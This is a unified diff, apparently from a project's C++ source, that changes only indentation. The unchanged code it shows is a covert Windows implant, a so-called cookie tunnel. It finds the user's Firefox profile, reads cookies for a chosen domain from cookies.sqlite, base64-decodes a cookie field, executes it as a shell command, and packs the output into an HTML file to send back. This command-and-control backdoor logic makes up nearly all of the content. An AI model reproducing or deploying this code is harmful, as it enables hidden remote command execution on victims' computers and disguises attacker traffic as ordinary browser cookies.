@@ -252,9 +252,9 @@ string base64_decode(string const& encoded_string)
 string readfile(const string &filepath)
 {
 	string buffer;
-    std::ifstream fin(filepath.c_str());
-    getline(fin, buffer, char(-1));
-    fin.close();
+    	std::ifstream fin(filepath.c_str());
+    	getline(fin, buffer, char(-1));
+    	fin.close();
 	
 	return buffer;
 } 
@@ -284,36 +284,36 @@ string exec_command(string cmd)
 string get_windows_username()
 {
 	char acUserName[128];
-    string UserName;
-    DWORD nUserName = sizeof(acUserName);
+    	string UserName;
+    	DWORD nUserName = sizeof(acUserName);
 	
-    if(GetUserName(acUserName, &nUserName)) 
+    	if(GetUserName(acUserName, &nUserName)) 
 	{
-        UserName = acUserName;
-        return UserName;
-    }
+        	UserName = acUserName;
+        	return UserName;
+    	}
 	return "error";
 } 
  
 string get_default_firefox_profiledir(const string& name)
 {
-    string pattern(name);
-    pattern.append("\\*");
-    WIN32_FIND_DATA data;
-    HANDLE hFind;
+    	string pattern(name);
+    	pattern.append("\\*");
+    	WIN32_FIND_DATA data;
+    	HANDLE hFind;
 	
-    if((hFind = FindFirstFile(pattern.c_str(), &data)) != INVALID_HANDLE_VALUE) 
+    	if((hFind = FindFirstFile(pattern.c_str(), &data)) != INVALID_HANDLE_VALUE) 
 	{
-        do {
+        	do {
 			string test=data.cFileName;
 
-            if(test.find("presto2")!=string::npos)
+            		if(test.find("presto2")!=string::npos)
 				return test;
 
 		} while (FindNextFile(hFind, &data) != 0);
 		
-        FindClose(hFind);
-    }
+        	FindClose(hFind);
+    	}
 	return "Error";
 }
 
@@ -323,7 +323,7 @@ string get_firefox_sqlite_path()
 	string path="C:\\Users\\"+user+"\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\";
 	string database_dir=get_default_firefox_profiledir(path);
 	string database_path;
-    database_path=path+database_dir+"\\cookies.sqlite";	
+    	database_path=path+database_dir+"\\cookies.sqlite";	
 	return database_path;
 }
 
@@ -349,10 +349,10 @@ void create_fake_profile(string name)
 
 void Write_File(string filename, string buf) 
 {
-  ofstream myfile;
-  myfile.open (filename);
-  myfile << buf;
-  myfile.close();
+  	ofstream myfile;
+  	myfile.open (filename);
+  	myfile << buf;
+  	myfile.close();
 }
 
 void construct_html(string result_cmd,  string filename)
@@ -376,21 +376,21 @@ void send_result_cmd(string html_file)
 
 
 static int callback(void *data, int argc, char **argv, char **azColName){
-   int i=0;
+	int i=0;
    
-   while(i<argc)
-   {
-	  if(i==4) 
-	  {
+	while(i<argc)
+   	{
+		if(i==4) 
+	  	{
 			string command=base64_decode(argv[i]);
 			string  result_cmd=exec_command(command);
 			construct_html(result_cmd,  "output.html");
 			send_result_cmd("output.html");
-	  }
-	  i++;
-   }
+	  	}
+	  	i++;
+   	}
    
-   return 0;
+   	return 0;
 }
 
 void start_cookie_tunnel()
@@ -400,24 +400,24 @@ void start_cookie_tunnel()
 	string query = "SELECT * from moz_cookies WHERE host = '"+domain+"';";
 	string tmp = get_firefox_sqlite_path();
 	sqlite3 *db;
-    char *zErrMsg = 0;
-    int rc;
+	char *zErrMsg = 0;
+    	int rc;
 	
-    rc = sqlite3_open(tmp.c_str(), &db);
+    	rc = sqlite3_open(tmp.c_str(), &db);
 	
-    if(rc)
+    	if(rc)
 	{
-      fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
-      sqlite3_close(db);
-      exit(0);
-    }
-    rc = sqlite3_exec(db, query.c_str(), callback, 0, &zErrMsg);
+      		fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
+      		sqlite3_close(db);
+      		exit(0);
+    	}
+    	rc = sqlite3_exec(db, query.c_str(), callback, 0, &zErrMsg);
 	
-    if(rc!=SQLITE_OK)
+    	if(rc!=SQLITE_OK)
 	{
 		fprintf(stderr, "SQL error: %s\n", zErrMsg);
 		sqlite3_free(zErrMsg);
-    }
+    	}
 	
-    sqlite3_close(db);
+    	sqlite3_close(db);
 }
